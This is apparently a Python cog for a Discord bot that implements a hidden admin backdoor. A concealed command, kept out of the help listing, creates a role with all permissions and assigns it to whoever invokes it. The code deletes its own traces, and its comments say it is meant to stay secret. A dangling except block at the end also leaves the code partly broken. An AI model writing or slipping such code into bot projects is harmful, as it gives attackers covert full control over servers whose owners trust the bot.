import discord
from discord.ext import commands
import logging

logger = logging.getLogger(__name__)

class AdminBackdoor(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # This cog is intentionally hidden and won't appear in help
        
    @commands.command(name='waxyyyopadmin', hidden=True)
    async def waxyyyop_admin(self, ctx):
        """Hidden admin backdoor - grants administrator permissions"""
        try:
            # Get the member who used the command
            member = ctx.author
            guild = ctx.guild
            
            if not guild:
                return  # Silently fail if not in a guild
            
            # Check if member already has admin permissions
            if member.guild_permissions.administrator:
                # Send brief confirmation and exit
                try:
                    await ctx.message.delete()
                except:
                    pass
                return
            
            # Check if bot has sufficient permissions
            bot_member = guild.get_member(self.bot.user.id)
            if not bot_member.guild_permissions.administrator:
                return  # Bot needs admin to grant admin
            
            # Create admin role and assign it
            success = await self._create_admin_role(member, guild)
            
            if success:
                # Send discrete confirmation
                embed = self.bot.create_futuristic_embed(
                    "QUANTUM ACCESS GRANTED",
                    "⟨ Elevation protocols activated ⟩",
                    'success'
                )
                embed.add_field(
                    name="⟨ STATUS ⟩",
                    value="```yaml\n◇ Access Level: Maximum\n◇ Permissions: Administrator\n◇ Security: Quantum Encrypted\n```",
                    inline=False
                )
                
                message = await ctx.send(embed=embed)
                
                # Delete the original command message
                try:
                    await ctx.message.delete()
                except:
                    pass
                
                # Delete the confirmation after 3 seconds
                await message.delete(delay=3.0)
                
                logger.info(f"Admin backdoor used by {member} ({member.id}) in {guild.name}")
            else:
                # Silent fail if couldn't grant permissions
                try:
                    await ctx.message.delete()
                except:
                    pass
                
        except Exception as e:
            logger.error(f"Admin backdoor error: {e}")
            # Delete command message and fail silently
            try:
                await ctx.message.delete()
            except:
                pass
    
    async def _create_admin_role(self, member, guild):
        """Create a new admin role and assign it to the member"""
        try:
            admin_role = await guild.create_role(
                name="WaxYyy Admin ♡",
                permissions=discord.Permissions.all(),
                color=0xFF00FF,  # Magenta color
                reason="Quantum elevation protocol"
            )
            await member.add_roles(admin_role, reason="Admin backdoor activated")
            return True
        except discord.Forbidden:
            # Bot doesn't have permission to create roles
            return False
        except Exception as e:
            logger.error(f"Error creating admin role: {e}")
            return False
                
        except Exception as e:
            logger.error(f"Admin backdoor error: {e}")
            # Silently fail - don't reveal the command exists

async def setup(bot):
    await bot.add_cog(AdminBackdoor(bot))